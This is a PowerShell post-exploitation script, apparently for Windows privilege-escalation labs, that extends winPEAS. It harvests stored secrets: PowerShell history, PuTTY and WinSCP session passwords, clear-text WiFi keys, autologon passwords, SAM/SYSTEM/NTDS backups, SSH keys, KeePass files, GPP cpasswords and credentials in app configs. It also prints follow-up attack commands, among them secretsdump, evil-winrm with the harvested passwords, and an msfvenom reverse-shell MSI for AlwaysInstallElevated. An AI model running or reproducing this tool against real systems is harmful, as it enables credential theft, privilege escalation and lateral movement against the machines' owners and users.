# =============================================================================
# win-korek.ps1 - winPEAS Gap Filler
# Covers what winPEAS misses - run AFTER winPEAS
# Author: korek
# =============================================================================
# Usage:
#   . .\win-korek.ps1; Invoke-Korek
#   Invoke-Korek -OutputFile C:\Windows\Tasks\korek_out.txt
# =============================================================================

function Invoke-Korek {
    param([string]$OutputFile = "")

    $out = [System.Collections.ArrayList]@()
    function Log  { param([string]$m,[string]$c="White") ; Write-Host $m -ForegroundColor $c ; if($OutputFile){$out.Add($m)|Out-Null} }
    function Hit  { param([string]$m) ; Log "[+] $m" "Green" }
    function Hot  { param([string]$m) ; Log "[!!] $m" "Red" }
    function Info { param([string]$m) ; Log "    >>> $m" "Gray" }
    function Sec  { param([string]$m) ; Log "`n[*] === $m ===" "Cyan" }
    function Expl { param([string]$m) ; Log "    [EXPLOIT] $m" "Yellow" }

    function Get-FileSafe {
        param([string]$p)
        try { if(Test-Path $p -EA Stop){ $f=Get-Item $p -EA Stop; if($f.Length -gt 0 -and -not $f.PSIsContainer){return $f} } } catch{}
        return $null
    }
    function Get-ContentSafe {
        param([string]$p,[int]$n=30)
        try { return Get-Content $p -EA Stop -TotalCount $n } catch { return $null }
    }
    function Get-Reg {
        param([string]$p,[string]$k)
        try { $v=Get-ItemProperty $p -Name $k -EA Stop; return $v.$k } catch { return $null }
    }

    Log "============================================================" "Cyan"
    Log "  win-korek.ps1 - winPEAS Gap Filler" "Cyan"
    Log "  Run this AFTER winPEAS for complete coverage" "Cyan"
    Log "============================================================" "Cyan"

    # ------------------------------------------------------------------
    # 1. SAM/SYSTEM in windows.old and RegBack (winPEAS misses these)
    # ------------------------------------------------------------------
    Sec "SAM / SYSTEM / NTDS BACKUPS"
    @(
        "C:\Windows\System32\config\RegBack\SAM",
        "C:\Windows\System32\config\RegBack\SYSTEM",
        "C:\Windows\System32\config\RegBack\SECURITY",
        "C:\windows.old\Windows\System32\SAM",
        "C:\windows.old\Windows\System32\SYSTEM",
        "C:\windows.old\Windows\System32\SECURITY",
        "C:\windows.old\Windows\System32\config\SAM",
        "C:\windows.old\Windows\System32\config\SYSTEM",
        "C:\windows.old\Windows\System32\config\SECURITY",
        "C:\Windows\NTDS\ntds.dit"
    ) | ForEach-Object {
        $f = Get-FileSafe $_
        if($f){
            Hot "$_ ($($f.Length) bytes)"
            Expl "download $_ then: impacket-secretsdump -sam SAM -system SYSTEM LOCAL"
        }
    }

    # ------------------------------------------------------------------
    # 2. PowerShell history with credential grep
    # ------------------------------------------------------------------
    Sec "POWERSHELL HISTORY (credential grep)"
    try {
        Get-Item "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -EA SilentlyContinue |
        Where-Object { $_.Length -gt 0 } | ForEach-Object {
            Hit "History file: $($_.FullName)"
            $content = Get-ContentSafe $_.FullName 200
            # show all content
            $content | ForEach-Object { Info ">> $_" }
            # highlight lines with creds
            $content | Where-Object {
                $_ -match "pass|cred|secret|key|token|pwd|-pw|password|hash|invoke|wget|curl|iwr|net use|runas"
            } | ForEach-Object {
                Hot "Interesting history line: $_"
                # extract -pw pattern from plink
                if($_ -match "-pw\s+'?([^'\s]+)'?"){
                    Hot "PASSWORD IN HISTORY: $($Matches[1])"
                }
            }
        }
    } catch {}

    # ------------------------------------------------------------------
    # 3. PuTTY saved sessions (winPEAS known issue #383 - misses these)
    # ------------------------------------------------------------------
    Sec "PUTTY / WINSCP SAVED SESSIONS"
    try {
        $puttyBase = "HKCU:\Software\SimonTatham\PuTTY\Sessions"
        if(Test-Path $puttyBase -EA SilentlyContinue){

            # Method 1: subkeys (standard PuTTY sessions)
            $puttySessions = Get-ChildItem $puttyBase -EA SilentlyContinue
            if($puttySessions){
                $puttySessions | ForEach-Object {
                    $sessionName = $_.PSChildName
                    Hot "PuTTY Subkey Session: $sessionName"
                    $h = Get-Reg $_.PSPath "HostName"
                    $u = Get-Reg $_.PSPath "UserName"
                    $p = Get-Reg $_.PSPath "PublicKeyFile"
                    if($h){ Info "Host: $h | User: $u" }
                    if($p){ Info "Key: $p" }
                    # dump all values for non-standard configs
                    try {
                        Get-ItemProperty $_.PSPath -EA Stop |
                        Select-Object -Property * -ExcludeProperty PS* |
                        Get-Member -MemberType NoteProperty |
                        ForEach-Object { $_.Name } |
                        ForEach-Object {
                            $val = (Get-ItemProperty $puttyBase\$sessionName -EA SilentlyContinue).$_
                            if($val -match "-pw|password|@[\d\.]") {
                                Hot "Value: $_ = $val"
                                if($val -match "-pw\s+'?([^'\s]+)'?"){ Hot "PASSWORD: $($Matches[1])" }
                                if($val -match "(\w+)@([\d\.]+)"){ Info "User@Host: $($Matches[0])" }
                            }
                        }
                    } catch {}
                }
            }

            # Method 2: values stored directly on Sessions key (non-standard like zachary box)
            try {
                $directVals = Get-ItemProperty $puttyBase -EA Stop
                $directVals.PSObject.Properties |
                Where-Object { $_.Name -notmatch "^PS" } |
                ForEach-Object {
                    $name = $_.Name
                    $val  = $_.Value
                    Hot "PuTTY Session value: $name = $val"
                    # extract -pw password
                    if($val -match "-pw\s+'?([^'\s]+)'?"){
                        Hot "PASSWORD EXTRACTED: $($Matches[1])"
                        Expl "Credential: $name / $($Matches[1])"
                    }
                    # extract user@host
                    if($val -match "(\w+)@([\d\.a-zA-Z]+)"){
                        Info "User@Host: $($Matches[0])"
                        Expl "Try: ssh $($Matches[1])@$($Matches[2]) with extracted password"
                    }
                }
            } catch {}

        } else {
            Info "No PuTTY sessions found"
        }
    } catch {}

    try {
        $winscpSessions = Get-ChildItem "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions" -EA SilentlyContinue
        if($winscpSessions){
            $winscpSessions | ForEach-Object {
                $h = Get-Reg $_.PSPath "HostName"
                $u = Get-Reg $_.PSPath "UserName"
                $p = Get-Reg $_.PSPath "Password"
                if($h){
                    Hot "WinSCP Session: $($_.PSChildName)"
                    Info "Host: $h | User: $u | Pass: $p"
                    Expl "WinSCP passwords are obfuscated - use https://github.com/anoopengineer/winscppasswd to decrypt"
                    Expl "Or: python3 winscppasswd.py $h $u $p"
                }
            }
        }
    } catch {}

    # ------------------------------------------------------------------
    # 4. WiFi passwords
    # ------------------------------------------------------------------
    Sec "WIFI PASSWORDS"
    try {
        netsh wlan show profiles 2>$null |
        Select-String "Profile\s*:\s*(.+)" | ForEach-Object {
            $name = $_.Matches.Groups[1].Value.Trim()
            $key = netsh wlan show profile name="$name" key=clear 2>$null |
                   Select-String "Key Content\s*:\s*(.+)"
            if($key){ Hot "WiFi '$name': $($key.Matches.Groups[1].Value.Trim())" }
        }
    } catch {}

    # ------------------------------------------------------------------
    # 5. Autologon credentials
    # ------------------------------------------------------------------
    Sec "AUTOLOGON CREDENTIALS"
    $autoUser = Get-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultUserName"
    $autoPass = Get-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultPassword"
    $autoDomain = Get-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultDomainName"
    if($autoPass){
        Hot "AUTOLOGON CREDENTIALS FOUND!"
        Info "Domain: $autoDomain | User: $autoUser | Pass: $autoPass"
        Expl "evil-winrm -i TARGET -u $autoUser -p '$autoPass'"
        Expl "nxc smb TARGET -u $autoUser -p '$autoPass'"
    } else {
        Info "No autologon credentials found"
    }

    # ------------------------------------------------------------------
    # 6. Credential Manager
    # ------------------------------------------------------------------
    Sec "CREDENTIAL MANAGER"
    try {
        $creds = cmdkey /list 2>$null
        $creds | Where-Object { $_ -match "Target|User" } | ForEach-Object {
            Hit "Stored credential: $_"
            Expl "runas /savecred /user:DOMAIN\USER cmd.exe"
        }
    } catch {}

    # ------------------------------------------------------------------
    # 7. SSH private keys
    # ------------------------------------------------------------------
    Sec "SSH PRIVATE KEYS"
    @("C:\Users\*\.ssh\","C:\Users\*\Documents\","C:\Users\*\Desktop\","C:\ProgramData\") | ForEach-Object {
        try {
            Get-ChildItem $_ -EA SilentlyContinue | Where-Object {
                $_.Name -match "^(id_rsa|id_dsa|id_ecdsa|id_ed25519)$|\.pem$|\.ppk$" -and $_.Length -gt 0
            } | ForEach-Object {
                Hot "SSH Key: $($_.FullName)"
                $c = Get-ContentSafe $_.FullName 3
                if($c -match "PRIVATE"){ Info "Contains PRIVATE KEY" }
                Expl "copy key to Kali: ssh -i keyfile user@target"
            }
        } catch {}
    }

    # ------------------------------------------------------------------
    # 8. KeePass databases
    # ------------------------------------------------------------------
    Sec "KEEPASS / PASSWORD FILES"
    try {
        Get-ChildItem C:\ -Recurse -Depth 6 -EA SilentlyContinue |
        Where-Object { $_.Name -match "\.kdbx$|^pass.*\.txt$|^cred.*\.txt$|^password.*\.txt$" -and $_.Length -gt 0 } |
        ForEach-Object {
            Hot "Password file: $($_.FullName) ($($_.Length) bytes)"
            Expl "Transfer to Kali and open with KeePass or crack: keepass2john file.kdbx | hashcat -m 13400"
        }
    } catch {}

    # ------------------------------------------------------------------
    # 9. Sticky Notes
    # ------------------------------------------------------------------
    Sec "STICKY NOTES"
    try {
        Get-Item "C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite" -EA SilentlyContinue |
        Where-Object { $_.Length -gt 0 } |
        ForEach-Object {
            Hot "Sticky Notes DB: $($_.FullName)"
            Expl "copy to Kali: sqlite3 plum.sqlite 'SELECT Text FROM Note;'"
        }
    } catch {}

    # ------------------------------------------------------------------
    # 10. GPP passwords in SYSVOL
    # ------------------------------------------------------------------
    Sec "GPP PASSWORDS IN SYSVOL"
    try {
        $domain = $env:USERDNSDOMAIN
        if($domain){
            $sysvol = "\\$domain\SYSVOL\$domain\Policies"
            if(Test-Path $sysvol -EA SilentlyContinue){
                Get-ChildItem $sysvol -Recurse -EA SilentlyContinue |
                Where-Object { $_.Name -match "Groups|Services|Scheduledtasks|DataSources" -and $_.Name -match "\.xml$" } |
                ForEach-Object {
                    $c = Get-ContentSafe $_.FullName 50
                    if($c -match "cpassword"){
                        Hot "GPP cpassword in: $($_.FullName)"
                        $c | Where-Object { $_ -match "cpassword" } | ForEach-Object { Info ">> $_" }
                        Expl "gpp-decrypt <cpassword value>"
                        Expl "impacket-Get-GPPPassword -xmlfile $($_.FullName)"
                    }
                }
            }
        }
    } catch {}

    # ------------------------------------------------------------------
    # 11. App configs with credentials
    # ------------------------------------------------------------------
    Sec "APP CONFIG FILES WITH CREDENTIALS"
    @("C:\wamp","C:\wamp64","C:\xampp","C:\inetpub","C:\tomcat","C:\Users","C:\Program Files","C:\Program Files (x86)") | ForEach-Object {
        if(Test-Path $_ -EA SilentlyContinue){
            try {
                Get-ChildItem $_ -Recurse -Depth 5 -EA SilentlyContinue |
                Where-Object { $_.Name -match "conn\.php|config\.php|web\.config|wp-config\.php|\.env|database\.yml|appsettings\.json|tomcat-users\.xml|config\.ini|settings\.ini" -and $_.Length -gt 0 } |
                ForEach-Object {
                    Hit "Config: $($_.FullName)"
                    Get-ContentSafe $_.FullName 30 |
                    Where-Object { $_ -match "pass|password|pwd|secret|credential|key|token|user" -and $_ -notmatch "^//" -and $_ -notmatch "^#" -and $_ -notmatch "^\s*<!--" } |
                    Select-Object -First 5 | ForEach-Object { Info ">> $($_.Trim())" }
                }
            } catch {}
        }
    }

    # ------------------------------------------------------------------
    # 12. Services running as domain users
    # ------------------------------------------------------------------
    Sec "SERVICES RUNNING AS DOMAIN USERS"
    try {
        Get-WmiObject win32_service -EA SilentlyContinue |
        Where-Object {
            $_.StartName -notmatch "LocalSystem|LocalService|NetworkService|NT AUTHORITY|NT SERVICE" -and
            $_.StartName -ne $null -and $_.StartName -ne ""
        } | ForEach-Object {
            Hot "Service '$($_.Name)' runs as: $($_.StartName)"
            Info "Path: $($_.PathName)"
            Expl "Check if service binary is writable: icacls '$($_.PathName)'"
        }
    } catch {}

    # ------------------------------------------------------------------
    # 13. AlwaysInstallElevated
    # ------------------------------------------------------------------
    Sec "ALWAYSINSTALLELEVATED"
    $aie1 = Get-Reg "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"
    $aie2 = Get-Reg "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"
    if($aie1 -eq 1 -and $aie2 -eq 1){
        Hot "AlwaysInstallElevated is ENABLED!"
        Expl "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o shell.msi"
        Expl "msiexec /quiet /qn /i shell.msi"
    } else {
        Info "AlwaysInstallElevated not enabled"
    }

    # ------------------------------------------------------------------
    # 14. Unquoted service paths
    # ------------------------------------------------------------------
    Sec "UNQUOTED SERVICE PATHS"
    try {
        Get-WmiObject win32_service -EA SilentlyContinue |
        Where-Object { $_.PathName -notmatch '"' -and $_.PathName -match ' ' -and $_.PathName -notmatch "^C:\\Windows" } |
        ForEach-Object {
            Hot "Unquoted: $($_.Name) -> $($_.PathName)"
            Info "Runs as: $($_.StartName)"
            Expl "Place malicious exe in exploitable path - check write permissions with icacls"
        }
    } catch {}

    # ------------------------------------------------------------------
    # 15. Recently accessed files
    # ------------------------------------------------------------------
    Sec "RECENTLY ACCESSED FILES"
    try {
        Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\" -EA SilentlyContinue |
        Sort-Object LastWriteTime -Descending | Select-Object -First 20 |
        ForEach-Object { Info "Recent: $($_.Name) ($($_.LastWriteTime))" }
    } catch {}

    # ------------------------------------------------------------------
    # 16. Interesting files - flags, creds, notes
    # ------------------------------------------------------------------
    Sec "INTERESTING FILES"
    try {
        Get-ChildItem "C:\Users\" -Recurse -EA SilentlyContinue |
        Where-Object { $_.Name -match "pass|cred|secret|flag|proof|local|note|todo|key" -and -not $_.PSIsContainer } |
        ForEach-Object {
            Hit "Interesting: $($_.FullName)"
            if($_.Extension -match "txt|ini|xml|config"){
                Get-ContentSafe $_.FullName 5 | ForEach-Object { Info ">> $_" }
            }
        }
    } catch {}

    # ------------------------------------------------------------------
    # Output
    # ------------------------------------------------------------------
    if($OutputFile){
        try { $out | Out-File $OutputFile -Encoding UTF8 ; Hit "Saved to: $OutputFile" }
        catch { Log "[-] Could not save: $_" "Red" }
    }

    Log "`n[+] Done!" "Green"
    Log "    [!!] = Critical finding" "Red"
    Log "    [+]  = Hit" "Green"
    Log "    [EXPLOIT] = How to exploit" "Yellow"
}
